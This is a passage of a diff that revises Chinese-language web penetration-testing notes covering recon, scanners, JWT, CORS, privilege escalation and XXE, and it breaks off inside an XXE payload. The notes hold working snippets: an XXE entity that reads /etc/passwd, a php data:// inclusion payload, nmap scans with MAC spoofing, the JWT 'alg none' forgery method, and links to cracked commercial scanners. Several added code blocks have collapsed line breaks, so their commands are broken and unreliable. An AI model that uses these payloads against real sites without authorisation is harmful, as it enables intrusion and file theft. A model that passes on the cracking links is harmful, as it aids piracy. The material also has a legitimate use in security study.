@@ -1,3 +1,5 @@
+
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515191227460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 - [写在前面](#写在前面)
 - [常见知识点](#常见知识点)
@@ -46,7 +48,6 @@
     - [中间件](#中间件)
     - [源码层面收集](#源码层面收集)
       - [github](#github)
-    - [CMS识别](#cms识别)
   - [特殊信息](#特殊信息)
     - [公司资产](#公司资产)
       - [特殊文件](#特殊文件)
@@ -109,7 +110,7 @@
       - [Burpsuite](#burpsuite)
         - [使用前准备](#使用前准备)
     - [通用漏洞扫描工具](#通用漏洞扫描工具)
-      - [Nessus](#nessus)
+      - [主机扫描](#主机扫描)
       - [网站扫描](#网站扫描)
     - [Cobaltstrike](#cobaltstrike)
     - [kali](#kali)
@@ -158,6 +159,7 @@
       - [逻辑漏洞](#逻辑漏洞)
         - [常规上传](#常规上传)
     - [文件删除](#文件删除)
+  - [CORS](#cors)
   - [业务层面漏洞](#业务层面漏洞)
     - [模块](#模块)
     - [方式](#方式)
@@ -165,8 +167,7 @@
       - [未授权访问](#未授权访问)
       - [竞态](#竞态)
       - [越权](#越权)
-        - [水平越权](#水平越权)
-        - [垂直越权](#垂直越权)
+        - [越权测试](#越权测试)
         - [防御](#防御-2)
   - [登录脆弱](#登录脆弱)
     - [漏洞类型](#漏洞类型)
@@ -191,19 +192,18 @@
     - [XXE 攻击有哪些类型？](#xxe-攻击有哪些类型)
       - [利用XXE检索文件](#利用xxe检索文件)
       - [利用XXE进行SSRF攻击？](#利用xxe进行ssrf攻击)
-    - [XXE 攻击](#xxe-攻击)
-      - [奇淫技巧](#奇淫技巧)
-      - [自动攻击工具](#自动攻击工具)
-      - [手动攻击](#手动攻击)
-      - [payload](#payload)
-        - [读取文件](#读取文件)
-        - [内网、ip、文件探测](#内网ip文件探测)
-        - [引入外部实体DTD](#引入外部实体dtd)
-        - [无回显读取文件](#无回显读取文件)
-      - [远程文件 SSRF](#远程文件-ssrf)
       - [XXE 亿笑攻击-DOS](#xxe-亿笑攻击-dos)
-    - [防御](#防御-3)
-  - [RCE（远程命令执行）](#rce远程命令执行)
+    - [寻找 XXE 注入的隐藏攻击面](#寻找-xxe-注入的隐藏攻击面)
+      - [前端数据没有定义DOCTYPE](#前端数据没有定义doctype)
+      - [允许上传特定文件，无xml在前端回显](#允许上传特定文件无xml在前端回显)
+      - [通过修改内容类型进行 XXE 攻击](#通过修改内容类型进行-xxe-攻击)
+    - [如何查找和测试 XXE 漏洞](#如何查找和测试-xxe-漏洞)
+      - [自动化工具](#自动化工具)
+      - [手动测试](#手动测试)
+    - [XXE防御方案](#xxe防御方案)
+  - [点击劫持（Clickjacking）](#点击劫持clickjacking)
+    - [什么是点击劫持？](#什么是点击劫持)
+  - [远程命令执行（RCE）](#远程命令执行rce)
     - [实例：网站可执行系统命令](#实例网站可执行系统命令)
   - [SQL注入](#sql注入)
     - [手工注入](#手工注入)
@@ -250,6 +250,24 @@
       - [从后端服务器引出有害响应](#从后端服务器引出有害响应)
       - [获取缓存的响应](#获取缓存的响应)
       - [如何防止网页缓存中毒漏洞](#如何防止网页缓存中毒漏洞)
+  - [身份验证漏洞](#身份验证漏洞)
+    - [身份验证漏洞是如何产生的？](#身份验证漏洞是如何产生的)
+    - [基于密码登录的漏洞](#基于密码登录的漏洞)
+      - [暴力攻击](#暴力攻击)
+        - [暴力破解用户名](#暴力破解用户名)
+        - [暴力破解密码](#暴力破解密码)
+        - [用户名枚举](#用户名枚举)
+    - [有缺陷的蛮力保护](#有缺陷的蛮力保护)
+        - [IP封锁](#ip封锁)
+        - [账户锁定](#账户锁定)
+        - [用户限速](#用户限速)
+    - [多因素身份验证中的漏洞](#多因素身份验证中的漏洞)
+      - [绕过两步验证](#绕过两步验证)
+  - [基于 DOM 的漏洞](#基于-dom-的漏洞)
+    - [什么是DOM？](#什么是dom)
+    - [污点流漏洞](#污点流漏洞)
+    - [如何防止基于 DOM 的污点流漏洞](#如何防止基于-dom-的污点流漏洞)
+    - [DOM 破坏](#dom-破坏)
   - [HTTP 主机头攻击](#http-主机头攻击)
     - [什么是 HTTP 主机标头？](#什么是-http-主机标头)
     - [HTTP Host 标头的目的是什么？](#http-host-标头的目的是什么)
@@ -269,7 +287,7 @@
       - [xss平台](#xss平台)
       - [beef-xss](#beef-xss)
     - [防御与绕过](#防御与绕过)
-      - [防御](#防御-4)
+      - [防御](#防御-3)
       - [绕过过滤](#绕过过滤)
   - [跨站请求伪造 (CSRF）](#跨站请求伪造-csrf)
     - [什么是CSRF？](#什么是csrf)
@@ -333,9 +351,12 @@
       - [+xxe](#xxe)
   - [中间件](#中间件-1)
     - [IIS](#iis)
+    - [JAVAWEB](#javaweb)
     - [Apache](#apache)
     - [Nginx](#nginx)
+    - [Shiro](#shiro)
     - [tomcat](#tomcat)
+    - [struct2](#struct2)
   - [组件](#组件)
     - [敏感信息搜集](#敏感信息搜集)
     - [工具](#工具-4)
@@ -350,9 +371,7 @@
   - [语言特性](#语言特性)
     - [PHP](#php)
       - [变量覆盖漏洞](#变量覆盖漏洞)
-    - [JAVAWEB](#javaweb)
-      - [JSON WEB TOKEN](#json-web-token)
-        - [破解](#破解-1)
+    - [JAVAWEB](#javaweb-1)
   - [蜜罐](#蜜罐)
   - [Webshell](#webshell)
 - [系统漏洞](#系统漏洞)
@@ -363,6 +382,8 @@
   - [字典](#字典)
     - [制作](#制作)
     - [fuzzy](#fuzzy)
+- [API漏洞](#api漏洞)
+- [微信小程序漏洞](#微信小程序漏洞)
 - [APP漏洞](#app漏洞)
   - [抓包](#抓包)
 - [待补充：应急响应](#待补充应急响应)
@@ -487,7 +508,7 @@
     - [一键审计](#一键审计)
     - [数据库监控](#数据库监控)
     - [常规代码审计](#常规代码审计)
-  - [JAVAWEB](#javaweb-1)
+  - [JAVAWEB](#javaweb-2)
     - [开发基础](#开发基础)
       - [Spring](#spring)
         - [基础介绍](#基础介绍)
@@ -501,7 +522,7 @@
         - [寻找可控输入](#寻找可控输入)
         - [过滤敏感字符方案](#过滤敏感字符方案)
       - [SQL注入](#sql注入-1)
-        - [防御](#防御-5)
+        - [防御](#防御-4)
       - [手动](#手动-1)
       - [工具](#工具-7)
 - [待补充：物理攻击](#待补充物理攻击)
@@ -543,10 +564,10 @@
 
 ## 密码学和编码
 
-
 **常用加密方式**
 对于网站常用base64对url中id进行加密
 对于数据库密码常用md5加密
+现在大多数网站内容为防止攻击，在前端采用AES/AES+RSA加密,所以你收到的返回的响应包是加密的，通用漏洞扫描工具对此更难解析
 
 **对称加密与非对称**
 对称加密是最快速、最简单的一种加密方式，加密与解密用的是同样的密钥。常见的对称加密算法：DES，AES等。
@@ -560,7 +581,7 @@
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628210715235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 md5:任意长度的数据，算出的MD5值长度都是固定的，一般是32位也有16位。由数字大小写混成。密文中字母大小写不会影响破解结果
 
-如何分辨base64【主要应用在web中用于对源码的加密或者用户名或者密码的加密】
+如何分辨base64
 长度一定会被4整除
 很多都以等号结尾(为了凑齐所以结尾用等号)，当然也存在没有等号的base64
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628205659976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
@@ -629,7 +650,7 @@ Redis:6379
  ~ a.com、b.com
  ~ url:80、url:90
 
- 只有Js脚本和Html模块必须在同一个源下，Js脚本才能读取或处理Html模块。同源策略能保护了自己域名的信息，即自己的html不能被外域名的Js脚本读取
+ 只有Js脚本和Html模块（即网页的前端数据）必须在同一个源下，Js脚本才能读取或处理Html模块。同源策略能保护了自己域名的信息，即自己的html不能被外域名的Js脚本读取
 
 **CDN**
  cdn全称是内容分发网络。其目的是让用户能够更快速的得到请求的数据。简单来讲，cdn就是用来加速的，他能让用户就近访问数据，这样就更更快的获取到需要的数据。举个例子，现在服务器在北京，深圳的用户想要获取服务器上的数据就需要跨越一个很远的距离，这显然就比北京的用户访问北京的服务器速度要慢。但是现在我们在深圳建立一个cdn服务器，上面缓存住一些数据，深圳用户访问时先访问这个cdn服务器，如果服务器上有用户请求的数据就可以直接返回，这样速度就大大的提升了。
@@ -800,7 +821,9 @@ DNS隧道工具将进入隧道的其他协议流量封装到DNS协议内，在�
 index.php（做个例子实际下index没太大意义）和网页展示的php通常不会是一样文件(网页只有js或html源码和F12结果是一样的，这可以用来判断一些网站是做前端验证还是服务器验证)，前者源码包含的文件更多，后者是解析后的文件。
 
 #### cookie
+
 ##### cookie会话验证和token验证区别以及安全问题
+
 之所以出现这些附加参数是因为http是无状态请求，即这一次请求和上一次请求是没有任何关系的，互不认识的，没有关联的。但这几种认证又有差别。也有的人直接称这一对的区别是cookie和session区别，这与我说的cookie会话和tooken是一个意思。
 
 cookie 会话。服务器验证是查看session id是否匹配得上。存储服务器 存活时间较短  大型。cookie 会话就像比如你登录了一次支付宝，过了几分钟（一般30分钟左右）不用或关闭了浏览器就还需要你登录。一个session在服务器上会占用1kb，人多了还是挺耗内存的。由于跨站自动带上cookie所以存在CSRF攻击。如果管理员在用户退出时未销毁就存在所谓的会话固定，会话固定只需要盗取session就可以登录了。
@@ -811,18 +834,45 @@ token 储存本地。服务器验证是查看参数附带的签名。存活时�
 [想阅读两者区别更多可看这篇文章](https://wuch886.gitbooks.io/front-end-handbook/content/session-cookiehe-token-san-zhe-de-guan-xi-he-qu-bie.html)
 
 ##### http中的cookie参数包含什么
+
 ```bash
 Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm;
 route=c0dbc3af6294b1446f771c1a1aa4c7cb;
 csrf=WfF1szMUHhiokx9AHFply5L2xAOfjRkE;
+Authorization=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
 ```
+**session**
+作用：记录用户状态。
+常见生成方法：账户标识字符串（用户名、id、邮箱、身份等）、IP、递增序号等
 **csrf**
 作用：防御csrf漏洞
 常见生成方法：通常加密强度伪随机数生成器 (PRNG)，以创建时的时间戳加上静态秘密作为种子，并对整个结构进行强散列
 使用：每次请求时带上经绑定session的csrf的值，每次操作csrf重新生成（防止复用和重放）
 可能产生漏洞：csrf可被分析出
+
+**JWT**
+
+作用：加密数据包或cookie
+常见生成方法：JWT分为头部(header)，声明(claims)，签名(signature)，三个部分以英文句号隔开。头部和声明会采用base64加密，签名加密与头部和声明都有关，还要进行整体的sha加密才可以得到最终值.
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/7384db1a2bd246bf87b27ed58e454c99.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_20,color_FFFFFF,t_70,g_se,x_16)
+
+加密方式如下图，对此的解密要用密匙才能解开。如果你还是困惑我表达的意思，你可以访问 https://jwt.io/ 输入一段JWT来交互加解密。
+![在这里插入图片描述](https://img-blog.csdnimg.cn/f1d68e5b7ff043b8a9b41fc514ce3eac.png)
+
+可能产生漏洞：1.JWT攻击取决于对方服务器是接收数据来进行什么样的下一步操作，如果是身份验证那么你就可以做到越权，如果是取数据与SQL语句拼接，那么你就可以做到SQL注入...
+
+2.JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么签名会被置空，这样任何token都是有效的。
+设定该功能的最初目的是为了方便调试。但是，若不在生产环境中关闭该功能，攻击者可以通过将alg字段设置为“None”来伪造他们想要的任何token，接着便可以使用伪造的token冒充任意用户登陆网站。
+
+jwt破解（需密钥）：爆破方法是将常用字典一个个当做秘钥，每个秘钥对应着不同的签名，将生成的签名与真实签名进行比较
+
+
+
+
 **rount**
 “route”是指根据url分配到对应的处理程序。
+
 #### 访问类型
 
 get传参与post传参的区别
@@ -848,7 +898,7 @@ get传参与post传参的区别
 
 最常见的
 200（成功） 
-403（禁止） 权限不够，服务器拒绝请求。
+403（禁止） 权限不够，服务器拒绝请求。对于403可以使用burpsuite插件尝试绕权限 https://github.com/sting8k/BurpSuite_403Bypasser
 404（未找到）
 
 
@@ -1062,16 +1112,9 @@ netstat -ano
 更多阅读，apache的.htaccess文件作用和相关浅析 https://www.jianshu.com/p/81305ca91ebd
 
 # 信息收集
-
-如果你是攻击中小型网站，你信息搜集第一步是获取网站全貌，在着重点于收集网站第三方或源码，这会加快你的渗透速度。
-最后无法搜集到才是做常规信息搜集。
-（搜集完之后对网站进行分类，优先测试最可能存在的漏洞点）
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210520155239679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-
 ## 信息搜集开源项目
 
-https://github.com/bit4woo/teemo
+自动化信息搜集（项目更新时间是2019年了）https://github.com/bit4woo/teemo
 
 
 
@@ -1079,15 +1122,33 @@ https://github.com/bit4woo/teemo
 
 
 ### 中间件
+**主流**
+wappalyzer浏览器插件自动搜集网站所采用的框架等https://github.com/AliasIO/wappalyzer/releases
+burpsuite插件，还能自动查找是否有CVE漏洞 software vulnerabliuty scanner
+百度搜索关键词打开链接：CMS在线识别网站
+**小众**
+通过寻找js匹配语句分析，分析成功一个后加规则填充到bp插件中，下次就不用手动分析了
+**识别方法1：利用工具**
 
-apache,iis,tomcat,nginx
+
+网上的公开cms识别原理是通过匹配识别的hash值字典匹配
+
+**识别方法2：观察网站信息**
+查看网站的powered by.。
 
 ### 源码层面收集
 
-通研究源代码，能够发现一些敏感目录，你可以通过右键点击查看到受渲染后的源码(不详细)，也可以点击F12后查看source/XX.js(有时候等同于你在做白盒测试了)
+通研究前端源代码，能够发现一些敏感目录，你可以通过打开开发者模式查看源码，有些网站会对开发者模式禁止，这时候你可以逐一尝试以下方案打开：
+* F12
+* shift-F5
+* 页面右键
 
-查看header:contype
-文件命名规则
+查看前端源码，你可以从以下几个角度查看
+* 文件命名规则
+* 增加攻击面(url、域名。推荐直接使用自动化js搜集资产信息工具https://github.com/Threezh1/JSFinder)
+* 敏感信息(密码、API密钥、加密方式)
+* 代码中的潜在危险函数操作
+* 具有已知漏洞的框架
 
 #### github
 
@@ -1397,45 +1458,6 @@ AWS SECRET
 "private" extension:pgp
 ```
 
-### CMS识别
-
-常见的开源CMS有
-
-```bash
-Dedecms discuz phpcms wordpress zblog phpweb aspcms
-```
-
-**识别方法1：利用工具**
-百度搜索关键词打开链接：CMS在线识别网站
-
-网上的公开cms识别原理是通过匹配识别的hash值字典匹配
-
-**识别方法2：观察网站信息**
-查看网站的powered by.。
-
-看F12中特别路径名，在百度搜索名字有可能出
-
-
-
-主动探测是与目标机器做交互。在做交互时不可避免会留下痕迹。如何隐藏自己请看技巧的代理小节
-
-
-
-**js信息收集**
-主要是爬取网站的敏感js文件，js中能收集到的信息:
-
-* 增加攻击面(url、域名)
-* 敏感信息(密码、API密钥、加密方式)
-* 代码中的潜在危险函数操作
-* 具有已知漏洞的框架
-
-常用的工具
-速度很快的jsfinder https://github.com/Threezh1/JSFinder
-
-xray的rad爬虫 https://github.com/chaitin/rad
-
-能够匹配敏感信息的JSINFO-SCAN：https://github.com/p1g3/JSINFO-SCAN
-
 ## 特殊信息
 
 ### 公司资产
@@ -1450,6 +1472,7 @@ xray的rad爬虫 https://github.com/chaitin/rad
 >你可以通过访问以下链接获取公司全貌，你可以很轻松的直接获得企业的分公司，全资子公司，网站域名、app,微信小程序，企业专利品牌信息，企业邮箱，电话等等
 >爱企查，免费，但不够全面[https://aiqicha.baidu.com/?from=pz](https://aiqicha.baidu.com/?from=pz)
 >微信小程序：企信通，付费，但网上有办法破解比爱企查更新更及时可以结合使用
+>小蓝本，免费，还可以查询子公司的网站
 >百度百科
 
 **收购**
@@ -1663,18 +1686,20 @@ www.xxx.com 加上/static;/backup
 
 ##### 工具
 
-**御剑后台扫描珍藏版**
-御剑后台扫描珍藏版:用于爆破目录，同时通过爆破出来的目录就可以知道网站是什么语言写的比如/admin/login.aspx就是用aspx。
-
-御剑后台扫描珍藏版下载网站](https://www.nnapp.cn/?post=211)；御剑55w增强版字典[文章有百度网盘链接](https://www.icode9.com/content-4-87412.html); 御剑85w 字典：http://www.coder100.com/index/index/content/id/833812
-
-使用十分简单。但是我在对同一个站点进行扫描两次的时候，发现结果不一样，因为我网速不好，但采用了默认的中断时常3秒。但目录有限，四万多很多都是php文件路径，目录路径，如果你的电脑能受得了。
-拿到一定信息后，通过拿到的目录名称，文件名称及文件扩展名了解网站开发人员的命名思路，确定其命名规则，推测出更多的目录及文件名
 **dirbuster**
 kali自带的一款工具，fuzz很方便。kali中直接在命令行中输入dirbuster，我认为该工具更强大，同样支持字典，还支持递归搜索和纯粹爆破，纯粹爆破你可以选择A-Z0-9a-z_，对于定向攻击来说纯粹爆破太强大了，直接帮助我发现隐藏各个目录,我在利用纯粹爆破将线程拉到50，仍旧需要10000+天以上（缺点是我用虚拟机跑的，字典大就慢）
 
 **dirsearch**
 https://github.com/maurosoria/dirsearch
+使用方法：
+
+```bash
+# 最基础使用# 参数含义-e 指定语言（java/python等） -x 排除某种返回码dirsearch -u https://baidu.com -e java -x 404
+```
+
+**burpsuite**
+BurpSuite Content discovery能自动化的的爬取扫描。
+
 ##### 目录爆破经验
 
 网上很多目录爆破只讲述了通过御剑或类似工具对URL进行拼接
@@ -2193,10 +2218,7 @@ nmap -A -v -sA -T0 --osscan-guess -p- -P0 --script=vuln --spoof-mac 09:22:71:11:
 **常用命令**
 
 ```bash
-nmap -A www.baidu.com## Nmap fast scan for the most 1000tcp ports usednmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP> 
-## Nmap fast scan for all the ports
-nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP> 
-## Nmap fast scan for all the ports slower to avoid failures due to -T4nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>#Bettercap2 Scansyn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
+nmap -A www.baidu.com## Nmap fast scan for the most 1000tcp ports usednmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP> ## Nmap fast scan for all the portsnmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP> ## Nmap fast scan for all the ports slower to avoid failures due to -T4nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>#Bettercap2 Scansyn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
 ```
 
 
@@ -2296,24 +2318,26 @@ Intruder是一个高度可配置工具，可以对web自动化攻击，模糊测
 
 nessus、openvas、xray、AWVS、NetSparker等
 
-#### Nessus 
+#### 主机扫描
+**Nessus** 
 
 Nessus 是目前全世界最多人使用的系统漏洞扫描与分析软件。总共有超过75,000个机构使用 Nessus 作为扫描该机构电脑系统的软件。
 如何破解[http://www.luckyzmj.cn/posts/477c90d0.html#toc-heading-1](http://www.luckyzmj.cn/posts/477c90d0.html#toc-heading-1)
 
 #### 网站扫描
-
 AWVS较为轻量，扫描快。APPscan大但全，一般为发现网站漏洞会结合使用
 **Awvs**
-
 注意:登录类网站扫描要带cookies扫才能扫到
 awvs_13.0.2009 web漏洞扫描器 安装教程,附下载破解包下载链接，具体看https://blog.csdn.net/weixin_41924764/article/details/109549947
+kali的docker安装 https://www.sqlsec.com/2020/04/awvs.html
 
 **AppScan**
-
 10.0.2安装破解 https://www.cnblogs.com/azhyueqin/p/14336807.html
 
+**burpsuit主动扫描**
 
+**xray**
+如果对方存在waf前面的主动扫描方式会有被封ip风险，xray相对来讲更安静
 
 ### Cobaltstrike
 
@@ -2325,6 +2349,7 @@ kali有600+渗透工具。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210510222251130.png)
 
 https://blog.csdn.net/jayjaydream/article/details/82945384
+
 #### 安装kali
 
 很多黑客教学都是首先教你装一个虚拟机，再将kali系统装在虚拟机上。如果你用这样方式去攻击外网服务器，那么你可能需要使用到端口转化/端口映射。
@@ -2342,12 +2367,14 @@ yum install dockersystemctl start dockersystemctl status dockerdocker pull regis
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210616170405781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 #### 扫描目标网站
+
 通常来讲一个网站有子域名，而对于主站的扫描通常不能指望一下能发现敏感信息
 **Nikto**是一个开源的WEB扫描评估软件，可以对Web服务器进行多项安全测试，能在230多种服务器上扫描出 2600多种有潜在危险的文件、CGI及其他问题。Nikto可以扫描指定主机的WEB类型、主机名、指定目录、特定CGI漏洞、返回主机允许的 http模式等。
+
 ```bash
-# 扫描ip端口并输出报告
-nikto -host URL/IP -port 80 -o res.html
+# 扫描ip端口并输出报告nikto -host URL/IP -port 80 -o res.html
 ```
+
 扫描映射web信息
 cewl www.xxx.com
 
@@ -2585,6 +2612,7 @@ jackson反序列化：利用需要特定条件，不常用
 apache solr反序列化：
 
 ## 文件操作
+
 文件包含
 可读取文件或代码执行
 文件删除
@@ -2596,7 +2624,9 @@ apache solr反序列化：
 如果是CSV 或者 Excel可以注意一下CSV注入
 
 ### 文件读取
+
 带来危害
+
 * 黑盒：目录遍历。读取系统敏感文件
 * 白盒：sql读写函数:load_file()和into outfile/dumpfile
 
@@ -2692,6 +2722,7 @@ http://127.0.0.1:8080/include.php?filename=data://text/plain,<?php%20phpinfo();?
 
 **其他可测**
 测一下是否下载是未授权漏洞
+
 ### 文件上传漏洞
 
 首先对文件上传类型进行区分，是属于编辑器文件上传，还是属于第三方应用，还是会员中心。要确保文件上传是什么类型，就用什么类型方法对它进行后期测试。
@@ -2701,6 +2732,8 @@ http://127.0.0.1:8080/include.php?filename=data://text/plain,<?php%20phpinfo();?
 
 字典生成 https://github.com/c0ny1/upload-fuzz-dic-builder
 
+
+一般测试时会先上传一个包含xss的html文件，看上传是否做了过滤
 
 **经验**
 上传参数名解析：明确那些东西能修改？
@@ -2811,6 +2844,13 @@ Windows不允许空格和点以及一些特殊字符作为结尾，创建这样�
 unlink，delfile是php中对应删除的函数
 删除数据库安装文件，可以重装数据库。
 
+## CORS
+
+如果在请求的数据包中有
+origin修改后，在返回的数据包中有：
+![在这里插入图片描述](https://img-blog.csdnimg.cn/955272a4338a4b7c83b63183f3205e1d.png)
+就说明有此漏洞。在测试时需要搭建一个vps，
+
 ## 业务层面漏洞
 
 ### 模块
@@ -2833,6 +2873,7 @@ unlink，delfile是php中对应删除的函数
 常见漏洞：文件上传绕过检测、购买物品余额查询绕过检测
 
 #### 越权
+
 越权测试可以使用burpsuite的Autoz插件，或手动测试（两个不同浏览器或一个开无痕的浏览器）在测试越权通常需要你建立两套不同的账户
 用户的授权过程是先检测账户名和密码或session等是不是对应得上，对应得上在根据用户的组给予相应权限。这里如果权限控制未设置准确就存在越权漏洞。
 
@@ -2841,40 +2882,14 @@ unlink，delfile是php中对应删除的函数
 
 垂直越权：使用低权限身份的账号，发送高权限账号才能有的请求，获得其高权限的操作。
 
-##### 水平越权
+##### 越权测试
 
-原理：
-
- - 前端安全造成：界面判断用户等级后，代码界面部分进行可选显示。
- - 后盾安全造成：数据库
-
-**常见修改参数**
+**手动常见修改参数**
 uid、用户名、cookie的uid、电话号
 
-**后果**
-隐私盗取
-网页私人业务办理
-**发现其他用户**
-用户名
-
-> 在注册时如果提示已存在用户 
-> 用户的评论等与网页的交互
-
-看id
-
-> 看用户传送到网页端的地址图像等可能含有他的ID
-> 看用户主页一般都有ID
-
-
-##### 垂直越权
-
-前提条件：获取的添加用户的数据包
-怎么来的数据包：
-1.普通用户前端有操作界面可以抓取数据包
-2.通过网站源码本地搭建自己去模拟抓取
-3.盲猜
-
-
+**工具测试**
+burpsuite插件 Authz
+[burpsuite功能compare site](https://blog.csdn.net/blood_pupil/article/details/90543849) 
 ##### 防御
 
 1.前后端同时对用户输入信息进行校验，双重验证机制
@@ -2887,20 +2902,30 @@ uid、用户名、cookie的uid、电话号
 
 **登录类型**
 在多个系统中，用户只需一次登录，各个系统即可感知该用户已经登录。比如阿里系的淘宝和天猫，很明显地我们可以知道这是两个系统，但是你在使用的时候，登录了天猫，淘宝也会自动登录。
+
 ### 漏洞类型
+
 * 开放性跳转（high）
+
 > 登录成功通常都有跳转
-> 
+
 * 密码明文或可被识别出的加密算法
+
 > 登录成功通常都有跳转
+
 * 用户密码可被枚举
+
 > 提示用户名错误
 > 无验证码或可绕过，ip不封锁
-> 
+
 * 自动登录参数暴露敏感信息（info）
+
  > 看参数值可以被验证是某框架
+
 * 会话固定
+
 > 登陆前通过软件工具抓取到的cookie信息值与在登录后抓取到的cookie进行对比，如果其值一样，则可判断其会话的cookies或者sessions未进行更新
+
 ### 验证脆弱
 
 
@@ -3064,6 +3089,7 @@ https://github.com/O365/python-o365
 ##### 待补充：AI破解
 
 ##### 绕过双因素验证
+
 双因素验证是个机巧的系统，难以正确实现。当你注意到站点使用了它时，你需要完整
 测试所有功能，包括 Token 的生命周期（如果站点管理员没有实现速率限制，就依靠于爆破），尝试的最大次数，复用过期的 Token，猜测Token 的可能性，以及其他。
 你也可以结合钓鱼来绕过。钓鱼即通过伪造页面截取用户的请求，用模拟软件来将用户的请求反馈到真实网站中，进而完成登录
@@ -3081,6 +3107,7 @@ https://github.com/ustayready/CredSniper
 
 
 ## XML 外部实体 (XXE) 注入
+
 ### 背景：什么是XML？
 
 XML 指可扩展标记语言（EXtensible Markup Language），它是用于存储和传输数据的最常用的语言
@@ -3092,108 +3119,32 @@ XML 指可扩展标记语言（EXtensible Markup Language），它是用于存�
 ### 什么是 XML 外部实体注入？
 
 XXE漏洞全称XML External Entity Injection 即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，**没有禁止外部实体的加载，如果禁止了就是合规的xml文件**，导致可加载恶意外部文件和代码，具体来说是XML的DTD会定义实体部分，实体部分对于XML就像是变量，**但他不仅是变量，还可以用来调用本地文件1.txt或外部实体https://baidu.com**。正因为这里实体有这么强大的功能，因此也容易被攻击。常见的攻击有任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。
+
 ### XXE 漏洞怎么验证？
+
 XXE漏洞出现在包含xml的文件，对于现实世界的 XXE 漏洞，提交的 XML 中通常会有大量数据值，其中任何一个都可能在应用程序的响应中使用。要系统地测试 XXE 漏洞，您通常需要单独测试 XML 中的每个数据节点，方法是使用您定义的实体并查看它是否出现在响应中。
 如下是一份含xml的请求，案例来自[靶场](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)在原始的xml文件中你需要增加你的恶意payload，并调用该变量。具体变量调用在productId还是storeId之间需要手动测试。
-```bash
-POST /product/stock HTTP/1.1
-Host: ac391f291f66563c80495011008200db.web-security-academy.net
-Connection: close
-Content-Length: 107
-Origin: https://ac391f291f66563c80495011008200db.web-security-academy.net
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
-Content-Type: application/xml
-Accept: */*
-Referer: https://ac391f291f66563c80495011008200db.web-security-academy.net/product?productId=2
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.9
-Cookie: session=hpqccPz9SimfThZLsXhO4Sa4xkDXHRRJ
 
-<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
+```bash
+POST /product/stock HTTP/1.1Host: ac391f291f66563c80495011008200db.web-security-academy.netConnection: closeContent-Length: 107Origin: https://ac391f291f66563c80495011008200db.web-security-academy.netUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36Content-Type: application/xmlAccept: */*Referer: https://ac391f291f66563c80495011008200db.web-security-academy.net/product?productId=2Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: session=hpqccPz9SimfThZLsXhO4Sa4xkDXHRRJ<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
 ```
 
 ### XXE 攻击有哪些类型？
+
 有多种类型的 XXE 攻击：
 
 利用 XXE 来检索 files，其中定义了一个包含文件内容的外部实体，并在应用程序的响应中返回。
 利用 XXE 执行 SSRF 攻击，其中根据后端系统的 URL 定义外部实体。
 利用盲 XXE 带外数据泄露，敏感数据从应用服务器传输到攻击者控制的系统。
 利用盲XXE通过错误消息检索数据，攻击者可以在其中触发包含敏感数据的解析错误消息。
+
 #### 利用XXE检索文件 
 
 ```bash
-# 读取服务器密码
-## 情况1：有回显
-<?xml version="1.0" encoding="ISO-8859-1"?> 
-<!DOCTYPE foo （foo取名任意） [
-<!ELEMENT foo ANY 其他任意实体 >
-<!ENTITY xxe（变量名） SYSTEM "file:///etc/passwd" >
-]>
-<foo>&xxe;</foo>
-
-## 情况2：无回显（+远程）
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [
